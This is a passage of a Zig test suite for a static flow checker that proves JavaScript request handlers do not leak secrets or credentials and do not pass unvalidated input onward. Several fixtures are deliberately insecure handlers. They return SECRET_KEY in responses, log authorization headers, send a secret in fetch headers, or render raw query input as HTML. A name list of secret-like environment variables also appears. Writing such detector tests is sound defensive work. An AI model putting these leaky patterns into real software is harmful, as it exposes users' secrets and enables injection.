    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var secret_response_count: usize = 0;
    for (checker.getDiagnostics()) |diagnostic| {
        if (diagnostic.kind == .secret_in_response) secret_response_count += 1;
    }
    try std.testing.expectEqual(@as(usize, 1), secret_response_count);
    try std.testing.expect(!checker.getProperties().no_secret_leakage);
}

test "FlowChecker accepts a literal passed through toolInput and returned" {
    const allocator = std.testing.allocator;
    const source =
        \\import { toolInput } from "zttp:tool";
        \\function handler(req) {
        \\  const parsed = toolInput("Input", { body: "\"safe\"" });
        \\  return Response.json(parsed.value);
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = @import("handler_verifier.zig").findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    for (checker.getDiagnostics()) |diagnostic| {
        try std.testing.expect(diagnostic.kind != .secret_in_response);
    }
    try std.testing.expect(checker.getProperties().no_secret_leakage);
}

test "FlowChecker keeps agentPrompt user input on a fetch body" {
    const allocator = std.testing.allocator;
    const source =
        \\import { fetch } from "zttp:fetch";
        \\import { agentPrompt } from "zttp:tool";
        \\function handler(req) {
        \\  const prompt = agentPrompt();
        \\  fetch("https://provider.example.com", { method: "POST", body: prompt.value });
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = @import("handler_verifier.zig").findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var unvalidated_egress_count: usize = 0;
    for (checker.getDiagnostics()) |diagnostic| {
        if (diagnostic.kind == .unvalidated_input_in_egress) unvalidated_egress_count += 1;
    }
    try std.testing.expectEqual(@as(usize, 1), unvalidated_egress_count);
    try std.testing.expect(!checker.getProperties().input_validated);
    try std.testing.expect(!checker.getProperties().injection_safe);
}

test "FlowChecker records validated defended path reaching an HTML response" {
    const allocator = std.testing.allocator;
    const source =
        \\import { escapeHtml } from "zttp:text";
        \\function handler(req) {
        \\  const raw = req.headers.get("x-name");
        \\  const safe = escapeHtml(raw);
        \\  return Response.html(safe);
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDefendedPaths()) |d| {
        if (d.property == .injection_safe) {
            found = true;
            try std.testing.expectEqual(SafeForm.validated, d.safe_form);
            try std.testing.expect(d.guard_func != null);
            try std.testing.expectEqualStrings("escapeHtml", d.guard_func.?);
        }
    }
    try std.testing.expect(found);
    try std.testing.expect(checker.getProperties().injection_safe);
}

test "FlowChecker records never_reached defended path for unused secret" {
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const k = env("SECRET_KEY");
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDefendedPaths()) |d| {
        if (d.property == .no_secret_leakage) {
            found = true;
            try std.testing.expectEqual(SafeForm.never_reached, d.safe_form);
            try std.testing.expect(d.guard_func == null);
        }
    }
    try std.testing.expect(found);
}

test "FlowChecker records no defended path for a leaking secret" {
    // A handler that actually leaks must not also claim a defended path for
    // the same property: violation and defended are mutually exclusive.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const k = env("SECRET_KEY");
        \\  return Response.json({ leaked: k });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    try std.testing.expect(!checker.getProperties().no_secret_leakage);
    for (checker.getDefendedPaths()) |d| {
        try std.testing.expect(d.property != .no_secret_leakage);
    }
}

test "LabelSet operations in flow context" {
    // Verify secret + credential merge
    const secret = LabelSet{ .secret = true };
    const cred = LabelSet{ .credential = true };
    const merged = LabelSet.merge(secret, cred);
    try std.testing.expect(merged.has(.secret));
    try std.testing.expect(merged.has(.credential));
    try std.testing.expect(!merged.has(.user_input));
}

test "isSensitiveEnvName" {
    try std.testing.expect(FlowChecker.isSensitiveEnvName("DB_PASSWORD"));
    try std.testing.expect(FlowChecker.isSensitiveEnvName("API_KEY"));
    try std.testing.expect(FlowChecker.isSensitiveEnvName("JWT_SECRET"));
    try std.testing.expect(FlowChecker.isSensitiveEnvName("ACCESS_TOKEN"));
    try std.testing.expect(FlowChecker.isSensitiveEnvName("PRIVATE_KEY"));
    try std.testing.expect(FlowChecker.isSensitiveEnvName("db_password"));
    try std.testing.expect(FlowChecker.isSensitiveEnvName("Auth_Header"));

    try std.testing.expect(!FlowChecker.isSensitiveEnvName("APP_NAME"));
    try std.testing.expect(!FlowChecker.isSensitiveEnvName("PORT"));
    try std.testing.expect(!FlowChecker.isSensitiveEnvName("NODE_ENV"));
    try std.testing.expect(!FlowChecker.isSensitiveEnvName("LOG_LEVEL"));
    try std.testing.expect(!FlowChecker.isSensitiveEnvName("DATABASE_URL"));
}

test "FlowProperties defaults to all proven" {
    const props = FlowProperties{};
    try std.testing.expect(props.no_secret_leakage);
    try std.testing.expect(props.no_credential_leakage);
    try std.testing.expect(props.input_validated);
    try std.testing.expect(props.pii_contained);
}

test "propertyTagForKind: every DiagnosticKind maps to the expected PropertyTag" {
    // Lock the current mapping. If a future change re-routes a flow-sink
    // category to a different property bucket, this assertion forces a
    // conscious update — without it, a silent mis-routing would weaken
    // the proven-property set in ways the existing flow tests would not
    // catch.
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_secret_leakage),
        propertyTagForKind(.secret_in_response),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_secret_leakage),
        propertyTagForKind(.secret_in_log),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_secret_leakage),
        propertyTagForKind(.secret_in_egress_url),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_secret_leakage),
        propertyTagForKind(.secret_in_egress_body),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_credential_leakage),
        propertyTagForKind(.credential_in_response),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_credential_leakage),
        propertyTagForKind(.credential_in_log),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_credential_leakage),
        propertyTagForKind(.credential_in_egress_url),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .injection_safe),
        propertyTagForKind(.unvalidated_input_in_egress),
    );
}

test "propertyTagForKind: every DiagnosticKind variant maps to a non-null PropertyTag" {
    // Exhaustiveness lock. The per-variant assertions above pin the
    // current mapping; this test pins the more important invariant that
    // EVERY variant maps to something. Without it, a future maintainer
    // adding a new DiagnosticKind can satisfy Zig's switch exhaustiveness
    // with `else => null,` — both the compiler and the per-variant test
    // stay green while the new variant silently disappears from the
    // proven-property surface (callers like proof_trace and
    // pi_repair_plan all use `orelse continue`).
    inline for (@typeInfo(DiagnosticKind).@"enum".fields) |field| {
        const kind: DiagnosticKind = @enumFromInt(field.value);
        const tag = propertyTagForKind(kind);
        std.testing.expect(tag != null) catch |err| {
            std.log.err(
                "DiagnosticKind.{s} has no PropertyTag mapping; add an arm to propertyTagForKind",
                .{field.name},
            );
            return err;
        };
    }
}

test "a real secret leak offers no repair intent" {
    // The end-to-end half of the invariant below: a ZTS400 produced by the
    // actual checker on actual source, not a struct built in a test.
    //
    // This test previously asserted the opposite. The reasoning it carried -
    // "the agent inserts a redact/mask/strip call ahead of the offending sink"
    // - describes an edit `insert_guard_before_line` does not make: the
    // primitive inserts a conditional, and no conditional removes a taint
    // label. The claim went unchallenged while nothing consumed the intent.
    // Once diagnostics began carrying it to the model, a recorded case burned
    // its whole attempt budget trying to build the guard this promised.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return Response.json({ leaked: secret });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var saw_secret_leak: bool = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .secret_in_response) {
            saw_secret_leak = true;
            try std.testing.expectEqual(@as(?RepairIntent, null), d.repair_intent);
        }
    }
    try std.testing.expect(saw_secret_leak);
}

test "FlowChecker flags secret returned through a variable-held response" {
    // The sink check must resolve `return res` back to the Response call that
    // produced it; a binding hop must not skip the response-sink analysis.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  const res = Response.json({ leaked: secret });
        \\  return res;
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .secret_in_response) found = true;
    }
    try std.testing.expect(found);
    try std.testing.expect(!checker.getProperties().no_secret_leakage);
}

test "FlowChecker flags unvalidated input in a variable-held Response.html" {
    const allocator = std.testing.allocator;
    const source =
        \\function handler(req) {
        \\  const page = Response.html(req.query.q);
        \\  return page;
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .unvalidated_input_in_egress) found = true;
    }
    try std.testing.expect(found);
    try std.testing.expect(!checker.getProperties().injection_safe);
}

test "FlowChecker flags secret returned through a ternary response" {
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return req.query.debug ? Response.json({ leaked: secret }) : Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .secret_in_response) found = true;
    }
    try std.testing.expect(found);
}

test "FlowChecker keeps taint through a user-defined wrapper call" {
    // A helper that returns its argument must not strip labels; dropping them
    // here launders any taint through a one-line wrapper.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function wrap(v) { return v; }
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return Response.json({ leaked: wrap(secret) });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .secret_in_response) found = true;
    }
    try std.testing.expect(found);
    try std.testing.expect(!checker.getProperties().no_secret_leakage);
}

test "FlowChecker keeps validated label through a wrapper returning a validator result" {
    // The callee summary must carry the callee's actual return labels: a
    // wrapper around escapeHtml yields .validated, not the argument union,
    // so no false XSS warning fires.
    const allocator = std.testing.allocator;
    const source =
        \\import { escapeHtml } from "zttp:text";
        \\function clean(v) { return escapeHtml(v); }
        \\function handler(req) {
        \\  return Response.html(clean(req.query.q));
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    for (checker.getDiagnostics()) |d| {
        try std.testing.expect(d.kind != .unvalidated_input_in_egress);
    }
    try std.testing.expect(checker.getProperties().injection_safe);
}

/// Shared harness for the cross-file path: run `exportedReturnLabels` over
/// `imported_source` for `name`, install the result on a checker built over
/// `source`, and report whether no_secret_leakage was proven. Mirrors what the
/// caller does with a real file, without touching the filesystem.
fn runWithImportedFunction(
    allocator: std.mem.Allocator,
    source: []const u8,
    imported_source: []const u8,
    name: []const u8,
) !bool {
    var imported_prepared = try source_frontend.PreparedSource.init(allocator, imported_source, "utils.ts", .{});
    defer imported_prepared.deinit();
    var imported_parser = try @import("zts-engine").parser.JsParser.init(allocator, imported_prepared.parserInput());
    var imported_atoms = atom_table.AtomTable.init(allocator);
    defer imported_atoms.deinit();
    imported_parser.setAtomTable(&imported_atoms);
    defer imported_parser.deinit();
    const imported_root = try imported_parser.parse();
    const imported_view = IrView.fromIRStore(&imported_parser.nodes, &imported_parser.constants);

    const pipeline = @import("pipeline.zig");
    var type_env_storage: pipeline.TypeEnvStorage = .{};
    defer type_env_storage.deinit(allocator);
    if (imported_prepared.typeMap()) |type_map| try type_env_storage.init(allocator, type_map);
    var type_checker: ?type_checker_mod.TypeChecker = null;
    defer if (type_checker) |*checker| checker.deinit();
    if (type_env_storage.envPtr()) |type_env| {
        type_checker = type_checker_mod.TypeChecker.init(allocator, imported_view, &imported_atoms, type_env, null);
        try std.testing.expectEqual(@as(u32, 0), try type_checker.?.check(imported_root));
    }

    var imported_checker = FlowChecker.init(allocator, imported_view, &imported_atoms);
    defer imported_checker.deinit();
    if (type_checker) |*checker| imported_checker.setTypeChecker(checker);
    const imported_labels = (try imported_checker.exportedReturnLabels(name)) orelse
        return error.ExportNotFound;
    if (type_checker) |*checker| try checker.ensureHealthy();

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    // The import's local slot, recovered the way the caller recovers it.
    var facts = try pipeline.buildModuleFacts(
        allocator,
        pipeline.ParsedModule.fromExisting(ir_view, root, &atoms),
        null,
    );
    defer facts.deinit();
    for (facts.imports.items) |rec| {
        if (std.mem.eql(u8, rec.imported_name, name)) {
            checker.setFileFunctionLabels(rec.slot, imported_labels);
        }
    }
    _ = try checker.check(handler_fn);
    return checker.getProperties().no_secret_leakage;
}

test "a secret returned by an imported function reaches the response" {
    const imported =
        \\import { env } from "zttp:env";
        \\export function readKey() { return env("SECRET_KEY"); }
    ;
    const source =
        \\import { readKey } from "./utils.ts";
        \\function handler(req) { return Response.json({ v: readKey() }); }
    ;
    try std.testing.expect(!try runWithImportedFunction(
        std.testing.allocator,
        source,
        imported,
        "readKey",
    ));
}

test "an imported function that returns a module-level secret reaches the response" {
    const imported =
        \\import { env } from "zttp:env";
        \\const key = env("SECRET_KEY") ?? "";
        \\export function readKey() { return key; }
    ;
    const source =
        \\import { readKey } from "./utils.ts";
        \\function handler(req) { return Response.json({ v: readKey() }); }
    ;
    try std.testing.expect(!try runWithImportedFunction(
        std.testing.allocator,
        source,
        imported,
        "readKey",
    ));

    // Control: a module-level constant that holds no secret keeps the property.
    const clean_imported =
        \\import { env } from "zttp:env";
        \\const region = env("REGION") ?? "";
        \\export function readRegion() { return region; }
    ;
    const clean_source =
        \\import { readRegion } from "./utils.ts";
        \\function handler(req) { return Response.json({ v: readRegion() }); }
    ;
    try std.testing.expect(try runWithImportedFunction(
        std.testing.allocator,
        clean_source,
        clean_imported,
        "readRegion",
    ));
}

test "an imported function carrying nothing keeps the property" {
    // The point of the cross-file summary: an ordinary helper in another file
    // must not cost the proof the way an untraceable call does.
    const imported =
        \\export function greet(name) { return ["hello ", name].join(""); }
    ;
    const source =
        \\import { greet } from "./utils.ts";
        \\function handler(req) { return Response.json({ v: greet("world") }); }
    ;
    try std.testing.expect(try runWithImportedFunction(
        std.testing.allocator,
        source,
        imported,
        "greet",
    ));
}

test "typed imported builtin receivers keep their pre-fallback labels" {
    const source =
        \\import { normalizeLabel } from "./utils.ts";
        \\function handler(req) { return Response.json({ v: normalizeLabel(" Ready ") }); }
    ;
    const string_helper =
        \\export structural LabelText = string;
        \\export structural NormalizedLabel = string;
        \\export function normalizeLabel(text: LabelText): NormalizedLabel {
        \\  return text.trim().toLowerCase();
        \\}
    ;
    try std.testing.expect(try runWithImportedFunction(
        std.testing.allocator,
        source,
        string_helper,
        "normalizeLabel",
    ));

    const array_source =
        \\import { normalizeLabels } from "./utils.ts";
        \\function handler(req) { return Response.json({ v: normalizeLabels(["a", "b"]) }); }
    ;
    const array_helper =
        \\export structural Labels = readonly string[];
        \\export function normalizeLabels(values: Labels): string {
        \\  return values.slice(0, 2).join("");
        \\}
    ;
    try std.testing.expect(try runWithImportedFunction(
        std.testing.allocator,
        array_source,
        array_helper,
        "normalizeLabels",
    ));
}

test "a typed arbitrary object method remains an unresolved function value" {
    const imported =
        \\export structural Trimmer = { trim: () => string };
        \\export function invoke(value: Trimmer): string { return value.trim(); }
    ;
    const source =
        \\import { invoke } from "./utils.ts";
        \\function handler(req) { return Response.json({ v: invoke({ trim: () => "ok" }) }); }
    ;
    try std.testing.expect(!try runWithImportedFunction(
        std.testing.allocator,
        source,
        imported,
        "invoke",
    ));
}

/// Shared harness: parse `source`, run the FlowChecker on its handler, and
/// return whether no_secret_leakage was proven. Frees everything it owns.
fn runNoSecretLeakage(allocator: std.mem.Allocator, source: []const u8) !bool {
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);
    return checker.getProperties().no_secret_leakage;
}

/// Shared harness: parse `source`, run the FlowChecker on its handler, and
/// return whether no_credential_leakage was proven.
fn runNoCredentialLeakage(allocator: std.mem.Allocator, source: []const u8) !bool {
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);
    return checker.getProperties().no_credential_leakage;
}

/// Shared harness: parse `source`, run the FlowChecker on its handler, and
/// return whether input_validated was proven. The counterpart to the leakage
/// harnesses above - it checks the label a validator is entitled to discharge
/// rather than the ones it must not.
fn runInputValidated(allocator: std.mem.Allocator, source: []const u8) !bool {
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);
    return checker.getProperties().input_validated;
}

/// Shared harness for route-dispatch regressions that must assert the exact
/// flow property a source is meant to break.
fn runFlowProperties(allocator: std.mem.Allocator, source: []const u8) !FlowProperties {
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);
    return checker.getProperties();
}

const FlowProperty = enum {
    no_secret_leakage,
    no_credential_leakage,
    input_validated,
    pii_contained,
    injection_safe,
    deterministic,

    fn holds(property: FlowProperty, properties: FlowProperties) bool {
        return switch (property) {
            .no_secret_leakage => properties.no_secret_leakage,
            .no_credential_leakage => properties.no_credential_leakage,
            .input_validated => properties.input_validated,
            .pii_contained => properties.pii_contained,
            .injection_safe => properties.injection_safe,
            .deterministic => properties.deterministic,
        };
    }
};

test "FlowChecker checks each flow property inside routerMatch route functions" {
    const Case = struct {
        property: FlowProperty,
        direct: []const u8,
        routed: []const u8,
    };
    const cases = [_]Case{
        .{
            .property = .no_secret_leakage,
            .direct =
            \\import { env } from "zttp:env";
            \\function handler(req) { return Response.json({ key: env("SECRET_KEY") }); }
            ,
            .routed =
            \\import { routerMatch } from "zttp:router";
            \\import { env } from "zttp:env";
            \\function leak(req) { return Response.json({ key: env("SECRET_KEY") }); }
            \\const routes = { "GET /leak": leak };
            \\function handler(req) {
            \\  const found = routerMatch(routes, req);
            \\  if (found === undefined) return Response.json({ error: "not found" });
            \\  return found.handler(req);
            \\}
            ,
        },
        .{
            .property = .no_credential_leakage,
            .direct =
            \\function handler(req) {
            \\  console.log(req.headers.authorization);
            \\  return Response.json({ ok: true });
            \\}
            ,
            .routed =
            \\import { routerMatch } from "zttp:router";
            \\function leak(req) {
            \\  console.log(req.headers.authorization);
            \\  return Response.json({ ok: true });
            \\}
            \\const routes = { "GET /leak": leak };
            \\function handler(req) {
            \\  const found = routerMatch(routes, req);
            \\  if (found === undefined) return Response.json({ error: "not found" });
            \\  return found.handler(req);
            \\}
            ,
        },
        .{
            .property = .input_validated,
            .direct =
            \\import { fetch } from "zttp:fetch";
            \\function handler(req) {
            \\  fetch("https://api.example.com/collect", { body: req.body ?? "" });
            \\  return Response.json({ ok: true });
            \\}
            ,
            .routed =
            \\import { routerMatch } from "zttp:router";
            \\import { fetch } from "zttp:fetch";
            \\function send(req) {
            \\  fetch("https://api.example.com/collect", { body: req.body ?? "" });
            \\  return Response.json({ ok: true });
            \\}
            \\const routes = { "POST /send": send };
            \\function handler(req) {
            \\  const found = routerMatch(routes, req);
            \\  if (found === undefined) return Response.json({ error: "not found" });
            \\  return found.handler(req);
            \\}
            ,
        },
        .{
            .property = .pii_contained,
            .direct =
            \\import { fetch } from "zttp:fetch";
            \\function handler(req) {
            \\  fetch(req.url, {});
            \\  return Response.json({ ok: true });
            \\}
            ,
            .routed =
            \\import { routerMatch } from "zttp:router";
            \\import { fetch } from "zttp:fetch";
            \\function send(req) {
            \\  fetch(req.url, {});
            \\  return Response.json({ ok: true });
            \\}
            \\const routes = { "POST /send": send };
            \\function handler(req) {
            \\  const found = routerMatch(routes, req);
            \\  if (found === undefined) return Response.json({ error: "not found" });
            \\  return found.handler(req);
            \\}
            ,
        },
        .{
            .property = .injection_safe,
            .direct =
            \\function handler(req) { return Response.html(req.url); }
            ,
            .routed =
            \\import { routerMatch } from "zttp:router";
            \\function show(req) { return Response.html(req.url); }
            \\const routes = { "GET /show": show };
            \\function handler(req) {
            \\  const found = routerMatch(routes, req);
            \\  if (found === undefined) return Response.json({ error: "not found" });
            \\  return found.handler(req);
            \\}
            ,
        },
        .{
            .property = .deterministic,
            .direct =
            \\function handler(req) { return Response.json({ now: Date.now() }); }
            ,
            .routed =
            \\import { routerMatch } from "zttp:router";
            \\function clock(req) { return Response.json({ now: Date.now() }); }
            \\const routes = { "GET /clock": clock };
            \\function handler(req) {
            \\  const found = routerMatch(routes, req);
            \\  if (found === undefined) return Response.json({ error: "not found" });
            \\  return found.handler(req);
            \\}
            ,
        },
    };

    try std.testing.expectEqual(std.meta.fields(FlowProperties).len, cases.len);
    inline for (std.meta.fields(FlowProperties), cases) |field, case| {
        try std.testing.expectEqualStrings(field.name, @tagName(case.property));
    }
    for (cases) |case| {
        const direct = try runFlowProperties(std.testing.allocator, case.direct);
        const routed = try runFlowProperties(std.testing.allocator, case.routed);
        try std.testing.expect(!case.property.holds(direct));
        try std.testing.expect(!case.property.holds(routed));
    }
}

test "FlowChecker checks egress headers inside routerMatch route functions" {
    const source =
        \\import { routerMatch } from "zttp:router";
        \\import { fetch } from "zttp:fetch";
        \\import { env } from "zttp:env";
        \\function send(req) {
        \\  fetch("https://api.example.com/collect", { headers: { authorization: env("SECRET_KEY") ?? "" } });
        \\  return Response.json({ ok: true });
        \\}
        \\const routes = { "POST /send": send };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, source)).no_secret_leakage);
}

/// Test harness: run the flow checker and hand back the number of diagnostics
/// of one kind, plus a copy of the help text of the first one in `help_buf`.
const FlowDiagnosticReport = struct {
    properties: FlowProperties,
    count: usize,
    help: []const u8,
};

fn runFlowDiagnostics(
    allocator: std.mem.Allocator,
    source: []const u8,
    kind: DiagnosticKind,
    help_buf: []u8,
) !FlowDiagnosticReport {
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
